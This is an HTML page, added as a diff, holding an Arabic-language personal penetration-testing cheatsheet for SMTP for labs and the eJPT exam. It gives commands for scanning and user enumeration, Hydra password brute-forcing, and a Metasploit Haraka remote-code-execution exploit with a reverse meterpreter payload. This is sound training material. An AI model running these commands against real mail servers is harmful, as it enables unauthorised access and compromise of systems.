@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<title>SMTP — Port 25 Cheatsheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero"><span class="tag">PORT 25 / TCP — SIMPLE MAIL TRANSFER PROTOCOL</span><h1>SMTP — من الفحص إلى الاستغلال</h1><p>مرجع سريع أثناء اللاب — اكتشاف الخدمة، تعداد المستخدمين، ثم الاستغلال إذا تطابقت النسخة</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div><div class="portnote">Ports: 25 SMTP، 465 SMTPS، 587 Submission. لا تفترض أن SMTP = 25 فقط.</div>
+<div class="portnote"><b>ملاحظة عن البورت:</b> يغطي هذا الملف SMTP على <b>25/TCP</b> مع البورتات الإضافية المذكورة هنا. إذا ظهر SMTP على بورت مختلف، استخدم البورت المكتشف في أوامر الفحص المناسبة. </div>
+<div class="toc"><span class="ttl">الفهرس</span><ol><li><a href="#s1">Reconnaissance</a></li><li><a href="#s2">Port Scanning</a></li><li><a href="#s3">Enumeration</a></li><li><a href="#s4">Credential Testing</a></li><li><a href="#s5">Exploitation</a></li><li><a href="#s6">Post-Exploitation</a></li></ol></div>
+<div class="stage" id="s1"><h2>1. Reconnaissance</h2><p class="desc">تأكد من الهدف والاتصال قبل فحص خدمة البريد</p><div class="step"><div class="step-title">التأكد من الهدف <span class="where">KALI TERMINAL</span> </div><div class="cmd">ping -c 4 [TARGET]</div><div class="note">إذا ICMP محجوب، انتقل مباشرة إلى Nmap واستخدم <code>-Pn</code> عند الحاجة.</div></div></div>
+<div class="stage" id="s2"><h2>2. Port Scanning</h2><p class="desc">اكتشاف SMTP وتحديد الـbanner / version قبل أي خطوة أخرى</p><div class="step"><div class="step-title">فحص SMTP وتحديد الإصدار <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -sS -sV [TARGET]</div></div><div class="step"><div class="step-title">Banner عبر Nmap <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -sV --script banner -p25 [TARGET]</div><div class="note">استخدم هذا الفحص للحصول على معلومات الـhost / banner من خدمة SMTP.</div><div class="result">GENERAL REFERENCE: Service/banner detection → ابحث عن تعريف SMTP والمنتج/الإصدار عندما يستطيع الفحص تحديدهما.</div></div><div class="step"><div class="step-title">اتصال يدوي بالخدمة <span class="where">KALI TERMINAL</span></div><div class="cmd">nc [TARGET] 25</div><div class="note">مفيد لرؤية رد SMTP مباشرة والتأكد أن الخدمة تتحدث البروتوكول المتوقع.</div><div class="result">GENERAL REFERENCE: SMTP greeting يبدأ عادة بكود 220 عند جاهزية الخدمة.</div></div></div>
+<div class="stage" id="s3"><h2>3. Enumeration</h2><p class="desc">تحديد إصدار SMTP ثم البحث عن حسابات مستخدمين صالحة</p><h3 class="sub">Version Detection</h3><div class="step"><div class="step-title">SMTP Version عبر Metasploit <span class="where">MSFCONSOLE</span></div><div class="cmd">use auxiliary/scanner/smtp/smtp_version
+set RHOSTS [TARGET]
+run</div></div><h3 class="sub">User Enumeration</h3><div class="step"><div class="step-title">تعداد المستخدمين بـ smtp-user-enum <span class="where">KALI TERMINAL</span></div><div class="cmd">smtp-user-enum -U [USERLIST] -t [TARGET]</div><div class="note">Wordlist المتاحة هنا: <code style="direction:ltr;display:inl-block">/usr/share/commix/src/txt/usernames.txt</code></div></div><div class="step"><div class="step-title">تعداد المستخدمين عبر Metasploit <span class="where">MSFCONSOLE</span></div><div class="cmd">use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS [TARGET]
+run</div><div class="note">استخدم هذه الوحدة لتحديد حسابات المستخدمين على النظام الهدف.</div></div><div class="tip"><b>Workflow:</b> Version/Banner → User Enumeration → إذا ظهر إصدار قابل للاستغلال، تحقق من شروط الـexploit قبل تشغيله.</div><h3 class="sub">Protocol Capabilities</h3><div class="step"><div class="step-title">EHLO / STARTTLS / AUTH <span class="where">KALI TERMINAL</span></div><div class="cmd">printf 'EHLO [CLIENT_NAME]\r\nQUIT\r\n' | nc [TARGET] [PORT]</div><div class="note">راجع الرد لوجود STARTTLS وAUTH mechanisms. استخدم openssl عند TLS/SMTPS.</div><div class="result">GENERAL REFERENCE: استجابة EHLO الناجحة تستخدم 250 وتعرض capabilities غالبًا على عدة أسطر. STARTTLS يعني أن الخادم يعلن إمكانية ترقية الاتصال الحالي إلى TLS. AUTH يعرض آليات المصادقة المعلنة ولا يعني امتلاك Credentials صالحة.</div></div><div class="step"><div class="step-title">SMTPS / STARTTLS inspection <span class="where">KALI TERMINAL</span></div><div class="cmd">openssl s_client -connect [TARGET]:465
+openssl s_client -starttls smtp -connect [TARGET]:587</div><div class="note">GENERAL REFERENCE: اختر الصيغة حسب البورت والخدمة المكتشفة.</div><div class="result">GENERAL REFERENCE: النجاح = اكتمال تفاوض TLS وظهور معلومات الشهادة/الاتصال بدل فشل handshake.</div></div></div>
+<div class="stage" id="s4"><h2>4. Credential Testing</h2><p class="desc">اختبر الاعتمادات فقط إذا SMTP AUTH مفعّل، وبأكثر من طريقة حيثما ينطبق.</p><h3 class="sub">Hydra</h3><div class="step"><div class="step-title">اختبار SMTP Authentication <span class="where">KALI TERMINAL</span></div><div class="cmd">hydra -L [USERLIST] -P [WORDLIST] [TARGET] smtp</div><div class="note">استخدمها فقط إذا الخادم يعلن SMTP AUTH وتملك تصريحًا للاختبار.</div></div><h3 class="sub">Metasploit</h3><div class="step"><div class="step-title">البحث عن وحدات SMTP authentication/login المناسبة <span class="where">MSFCONSOLE</span></div><div class="cmd">search type:auxiliary smtp login</div><div class="note">اختر الوحدة المطابقة لما اكتشفته فعليًا؛ لا تفترض وجود Authentication إذا الخادم ما يعلنه.</div></div></div><div class="stage" id="s5"><h2>5. Exploitation</h2><p class="desc">المسار الاستغلالي هنا: Haraka Remote Command Execution</p><div class="danger">تحذير: تأكد من الإصدار ونظام التشغيل والشروط المسبقة قبل أي exploit.</div><h3 class="sub">Linux — Haraka &lt; 2.8.9 <span class="badge lin">LINUX</span></h3><div class="step"><div class="step-title">إعداد exploit في Metasploit <span class="where">MSFCONSOLE</span></div><div class="cmd">use exploit/linux/smtp/haraka
+set RHOSTS [TARGET]
+set SRVPORT 9898
+set email_to root@[TARGET_DOMAIN]
+set payload linux/x64/meterpreter_reverse_http
+check</div><div class="note">Version-specific. هذا المسار يحدد <code>SRVPORT 9898</code> والـpayload أعلاه، ويطلب <code>check</code> قبل التنفيذ. استبدل الدومين بقيمة الهدف الفعلية في اللاب.</div></div><div class="step"><div class="step-title">التنفيذ بعد نجاح التحقق <span class="where">MSFCONSOLE</span></div><div class="cmd">run</div><div class="note">لا تفترض Expected Result ثابتًا؛ تحقق من نتيجة الـmodule الفعلية بعد التشغيل.</div></div><div class="step"><div class="step-title">التحقق من Haraka <span class="where">KALI TERMINAL</span> <span class="badge lin">LINUX</span></div><div class="cmd">nmap -sV -p25 [TARGET]</div><div class="note">هذا المسار خاص بـ <b>Haraka &lt; 2.8.9</b>. لا تنتقل للاستغلال إلا إذا كانت الخدمة والإصدار متطابقين.</div></div><div class="danger"><b>تحذير:</b> لا تشغّل exploit لمجرد أن البورت 25 مفتوح. تأكد من أن الخادم هو Haraka وأن الإصدار يقع ضمن النطاق المذكور هنا.</div></div>
+<div class="stage" id="s6"><h2>6. Post-Exploitation</h2><p class="desc">بعد الحصول على جلسة فعلية — تحقق فقط من الوصول ثم انتقل لملف Post-Exploitation المناسب</p><div class="step"><div class="step-title">التحقق من الهوية <span class="where">VICTIM SHELL</span> </div><div class="cmd">whoami
+id</div><div class="note">هذه خطوة تحقق عامة بعد الوصول وليست مؤشر نجاح خاصًا ببروتوكول SMTP.</div></div></div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+      هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+      يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+      مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+    </div>
+</footer>
+</div></body></html>
